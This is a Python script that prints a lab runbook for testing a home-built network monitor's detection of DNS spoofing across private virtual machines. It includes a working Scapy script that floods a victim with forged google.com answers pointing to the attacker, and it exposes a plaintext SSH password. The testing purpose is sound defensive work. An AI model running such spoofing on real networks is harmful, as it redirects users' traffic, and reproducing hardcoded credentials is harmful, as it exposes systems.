#!/usr/bin/env python3
"""
COMPLETE DNS ATTACK TEST EXECUTION GUIDE
Execute these steps in order
"""

print("""
╔══════════════════════════════════════════════════════════════════════════╗
║         COMPLETE DNS ATTACK TEST - EXECUTION GUIDE                       ║
║         Date: January 19, 2026                                           ║
╚══════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════
SYNC STATUS
═══════════════════════════════════════════════════════════════════════════

✅ Monitor VM (192.168.128.8)
   └─ Files synced successfully
   └─ production_system.py updated with DNS baseline fix
   └─ Attack scripts available
   └─ Awaiting system restart

⚠️  Attacker VM (192.168.128.101)
   └─ SSH port closed (cannot rsync)
   └─ Network reachable (ping works)
   └─ Solution: Execute attack directly via SSH

❌ Victim VM (192.168.128.6)
   └─ SSH auth failed
   └─ Not critical (Attacker will be attack source)

═══════════════════════════════════════════════════════════════════════════
STEP-BY-STEP EXECUTION
═══════════════════════════════════════════════════════════════════════════

PHASE 1: PREPARE MONITOR VM (Terminal 1 on Monitor)
═══════════════════════════════════════════════════════════════════════════

1. SSH into Monitor VM:

   ssh -o StrictHostKeyChecking=no monitor@192.168.128.8
   Password: achu2006

2. Navigate to securenet:

   cd ~/securenet

3. Stop any running production system:

   sudo pkill -f "python3.*production_main" 2>/dev/null || true
   sleep 2

4. Start production system with DNS baseline fix:

   sudo python3 production_main.py \\
     --interactive \\
     --interface enp0s1 \\
     --config production_config.yaml \\
     --log-level INFO

   Expected output:
   ✅ Production system initialized successfully
   🛡️ Starting network monitoring on enp0s1
   Monitoring active...

5. ✅ Monitor is ready! Leave this terminal running.

═══════════════════════════════════════════════════════════════════════════

PHASE 2: VIEW LOGS IN REAL-TIME (Terminal 2 on Monitor)
═══════════════════════════════════════════════════════════════════════════

1. SSH into Monitor VM (new terminal):

   ssh -o StrictHostKeyChecking=no monitor@192.168.128.8

2. Watch security events:

   cd ~/securenet
   sudo tail -f production_security.log | grep -i "dns\\|alert"

   Leave this running to see attacks as they're detected.

═══════════════════════════════════════════════════════════════════════════

PHASE 3: EXECUTE DNS ATTACK (Terminal 3 on Attacker VM)
═══════════════════════════════════════════════════════════════════════════

1. SSH into Attacker VM:

   NOTE: SSH port is closed on Attacker. You have options:
   
   Option A: Boot Attacker VM and enable SSH
   Option B: Run attack from Victim VM instead
   Option C: Send attack inline via SSH tunneling (below)

2A. If you can access Attacker VM terminal directly:

   cd ~/securenet
   python3 run_dns_attack.py

2B. If running attack inline (no file needed):

   python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp
import random, time

iface = "eth0"  # Change to enp0s1 if needed
attacker_ip = "192.168.128.101"
victim_ip = "192.168.128.6"

print("\\n🔥 DNS SPOOFING ATTACK\\n")
start = time.time()
pkt_count = 0

for i in range(50):
    pkt = IP(src=attacker_ip, dst=victim_ip) / \\
          UDP(sport=53, dport=random.randint(10000, 60000)) / \\
          DNS(id=random.randint(0, 65535), qr=1, rd=1, ra=1,
              qd=DNSQR(qname="google.com"),
              an=DNSRR(rrname="google.com", ttl=10, rdata=attacker_ip))
    sendp(pkt, iface=iface, verbose=False)
    pkt_count += 1
    time.sleep(0.1)

elapsed = time.time() - start
print(f"✅ Attack complete: {pkt_count} packets in {elapsed:.1f}s\\n")
EOF

═══════════════════════════════════════════════════════════════════════════

PHASE 4: MONITOR DETECTION (Watch Terminal 2)
═══════════════════════════════════════════════════════════════════════════

Expected detection within 5-30 seconds of attack start:

In Terminal 2 logs, you should see:

────────────────────────────────────────────────────────────────────────────
2026-01-19 21:15:45 - SECURITY ALERT - CRITICAL - ATTACK DETECTED: DNS_SPOOFING
2026-01-19 21:15:45 - Source IP: 192.168.128.101
2026-01-19 21:15:45 - Source MAC: [attacker MAC]
2026-01-19 21:15:45 - Confidence: 0.75
2026-01-19 21:15:45 - Detection Method: ANOMALY_BASED
2026-01-19 21:15:45 - Alert ID: [unique ID]
2026-01-19 21:15:45 - lan_security_system.core.system_integration_production - INFO - Executing production mitigation for dns_spoofing
────────────────────────────────────────────────────────────────────────────

If you see this: ✅ SUCCESS! DNS detection is working!

═══════════════════════════════════════════════════════════════════════════

VERIFICATION STEPS
═══════════════════════════════════════════════════════════════════════════

1. Check detection engine baseline initialized:

   On Monitor, check logs for:
   "Detector baselines initialized"

2. Verify attack packets reached Monitor:

   In Terminal 2 on Monitor:
   sudo tcpdump -i enp0s1 'port 53' -n -c 5

3. Check JSON security events:

   On Monitor:
   tail -f ~/securenet/security_events.jsonl | jq '.attack_type'

4. Verify baseline was set:

   On Monitor:
   grep "Baseline.*initialized" ~/securenet/production_security.log

═══════════════════════════════════════════════════════════════════════════

TROUBLESHOOTING
═══════════════════════════════════════════════════════════════════════════

Problem: No alert after attack
├─ Check: Monitor system running? (ps aux | grep production_main)
├─ Check: Interface correct? (ip link show → should show enp0s1)
├─ Check: Logs created? (ls -l production_security.log)
└─ Check: Baseline initialized? (grep baseline production_security.log)

Problem: Connection refused on Attacker SSH
├─ Solution: Boot Attacker VM manually in hypervisor
├─ Or: Run attack from Victim VM instead
└─ Or: Use inline attack code (no SSH needed)

Problem: Scapy not found
└─ Solution: pip3 install scapy

Problem: Interface eth0 not found
├─ Check: ip link show
├─ Try: eth0, enp0s1, ens3, ens33
└─ Update: interface name in attack script

═══════════════════════════════════════════════════════════════════════════

KEY POINTS
═══════════════════════════════════════════════════════════════════════════

✅ DNS detector baseline initialized with:
   • google.com → 8.8.8.8 (TTL: 3600s expected)
   • cloudflare.com → 1.1.1.1
   • dns.google → 8.8.8.8
   • Others in baseline list

✅ Attack TTL: 10 seconds (triggers anomaly: 3600 - 10 = 3590 > 600 threshold)

✅ Detection method: ANOMALY_BASED (TTL variance detection)

✅ Expected latency: 5-30 seconds from attack start to alert

✅ Confidence score: 0.70-0.85

═══════════════════════════════════════════════════════════════════════════

NEXT STEPS AFTER SUCCESSFUL DNS DETECTION
═══════════════════════════════════════════════════════════════════════════

Once DNS attack is detected:

1. Document the alert in logs
2. Note detection latency (target: < 30 seconds)
3. Check mitigation response (alert-only mode for DNS)
4. Test MAC flooding attack next
5. Verify system stability during active threats

═══════════════════════════════════════════════════════════════════════════
""")
